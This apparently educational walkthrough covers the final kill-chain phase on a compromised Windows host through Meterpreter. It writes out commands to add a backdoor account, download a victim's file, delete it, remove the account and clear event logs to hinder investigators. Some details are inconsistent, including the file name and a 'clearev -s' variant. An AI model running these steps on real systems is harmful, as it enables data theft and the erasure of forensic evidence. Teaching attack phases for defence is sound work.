# Actions on Objectives Phase

## Objective:
Achieve the attacker's end goals, such as data theft, disruption, or destruction.

### Step 1: Add a New User
In the **Actions on Objectives** phase, the attacker takes actions to gain further control, exfiltrate data, and disrupt or destroy the system. The first step is often to add a new user to maintain access even if the initial exploit is closed or the system is rebooted.

Using **Meterpreter**, the attacker can add a new user named `eviluser` with the password `password123`.

1. Add a New User:

```
net user eviluser password123 /add
```
The attacker successfully adds the new user, ensuring they can regain access if necessary.



### Step 2: Exfiltrate Data
Next, the attacker moves to exfiltrate sensitive data. This could involve copying files, extracting credentials, or stealing proprietary information. In this scenario, the attacker will navigate to a folder named **secret folder** and download a file named **important doc.txt**.

1. Navigate to the Folder and Download File:

```
cd C:\Users\Bob\Documents\secret folder
download important_doc.txt
```
The attacker successfully downloads the file containing sensitive data from the compromised machine to their own system.



### Step 3: Delete the Exfiltrated Data
After the data has been exfiltrated, the attacker deletes the file from the compromised system to cover their tracks and prevent detection.

1. Delete the File:

```
rm important_doc.txt
```
The attacker successfully removes the exfiltrated file from the target machine.



### Step 4: Remove the Created User
After completing their objectives, the attacker removes any users they created during the attack to prevent detection. In this case, the attacker removes the `eviluser` they added earlier.

1. Remove the User:

```
net user eviluser /delete
```
The attacker successfully removes the created user, eliminating any trace of additional user accounts on the system.



### Step 5: Clear System and Security Logs
Finally, to avoid detection and remove evidence of the attack, the attacker clears the system and security logs on the compromised machine. This action erases any trace of the attacker's activities, making it difficult for security teams to investigate the attack.

1. Clear System Logs:

```
clearev
```
The attacker successfully clears the system event logs, removing traces of malicious activity.

2. Clear Security Logs:

```
clearev -s
```
The attacker successfully clears the security event logs, ensuring there are no recorded traces of their actions.



# Conclusion: The Attack Phase is Complete
With the **Actions on Objectives** phase complete, the attacker has achieved their end goals, including:

- **Created a new user** for persistent access.
- **Exfiltrated sensitive data** from the target machine.
- **Deleted the exfiltrated data** to cover their tracks.
- **Removed the user account** they created to leave no signs of unauthorized access.
- **Cleared system and security** logs to erase any traces of the attack.

With these actions, the attacker has successfully carried out their objectives and left little evidence of their presence, making it harder for investigators to trace back to the initial compromise.
